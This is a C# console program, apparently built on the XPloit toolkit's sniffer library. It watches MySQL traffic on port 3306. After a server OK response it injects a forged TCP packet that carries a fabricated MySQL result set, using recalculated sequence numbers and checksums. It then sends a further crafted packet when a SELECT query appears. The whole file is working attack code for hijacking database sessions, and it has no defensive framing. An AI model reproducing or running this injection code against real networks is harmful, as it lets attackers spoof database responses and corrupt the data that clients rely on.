using PacketDotNet;
using System;
using System.Linq;
using System.Text;
using XPloit.Sniffer;
using XPloit.Sniffer.Filters;
using XPloit.Sniffer.Interfaces;

namespace ConsoleApplication1
{
    class Program
    {
        static EthernetPacket Parent;
        static uint LastSequenceId = 0;
        static byte[] Payload = new byte[]
             {
                0x01,0x00,0x00,0x01,0x01,0x17,0x00,0x00,0x02,0x03,0x64,0x65,0x66,0x00,0x00,
                0x00,0x01,0x31,0x00,0x0c,0x3f,0x00,0x01,0x00,0x00,0x00,0x08,0x81,0x00,0x00,
                0x00,0x00,0x05,0x00,0x00,0x03,0xfe,0x00,0x00,0x02,0x00,0x02,0x00,0x00,0x04,
                0x01,0x31,0x05,0x00,0x00,0x05,0xfe,0x00,0x00,0x02,0x00,
             };
        static byte[] ResponseOk = new byte[] { 0x07, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00 };

        static void Main(string[] args)
        {
            using (NetworkSniffer ns = new NetworkSniffer("Ethernet"))
            {
                ns.Filter = "tcp";
                ns.Filters = new IIpPacketFilter[] { new SnifferPortFilter(3306) };

                ns.OnPacket += Ns_OnPacket;

                ns.Start();

                Console.WriteLine("Press any key for exit");
                Console.ReadKey();
            }
        }
        static void Ns_OnPacket(object sender, IPProtocolType protocolType, EthernetPacket packet)
        {
            NetworkSniffer ns = (NetworkSniffer)sender;
            IPv4Packet ip = (IPv4Packet)packet.PayloadPacket;
            TcpPacket t = (TcpPacket)ip.PayloadPacket;

            if (t.PayloadData.SequenceEqual(ResponseOk))
            {
                Parent = packet;

                LastSequenceId = (uint)(t.SequenceNumber + t.PayloadData.Length);
                ip.Id++;
                t.SequenceNumber = LastSequenceId;
                t.OptionsCollection.Clear();

                t.PayloadData = Payload;
                t.Ack = true;
                t.Psh = true;

                ip.UpdateCalculatedValues();
                t.UpdateCalculatedValues();

                ip.UpdateIPChecksum();
                t.UpdateTCPChecksum();

                ns.Send(packet);

                LastSequenceId = (uint)(t.SequenceNumber + t.PayloadData.Length);
                Console.WriteLine(t.ToString(StringOutputType.Verbose));
            }
            else
            {
                string ascii = Encoding.ASCII.GetString(t.PayloadData);
                if (Parent != null && ascii.Contains("SELECT"))
                {
                    ns.OnPacket -= Ns_OnPacket;

                    ip = (IPv4Packet)Parent.PayloadPacket;
                    t = (TcpPacket)ip.PayloadPacket;

                    t.SequenceNumber = LastSequenceId;
                    t.AcknowledgmentNumber = t.AcknowledgmentNumber;
                    t.PayloadData = new byte[] { };
                    ip.Id++;
                    t.Ack = true;
                    t.Psh = false;

                    ip.UpdateCalculatedValues();
                    t.UpdateCalculatedValues();

                    ip.UpdateIPChecksum();
                    t.UpdateTCPChecksum();

                    ns.Send(packet);
                    Console.WriteLine(t.ToString(StringOutputType.Verbose));
                }
            }
        }
    }
}
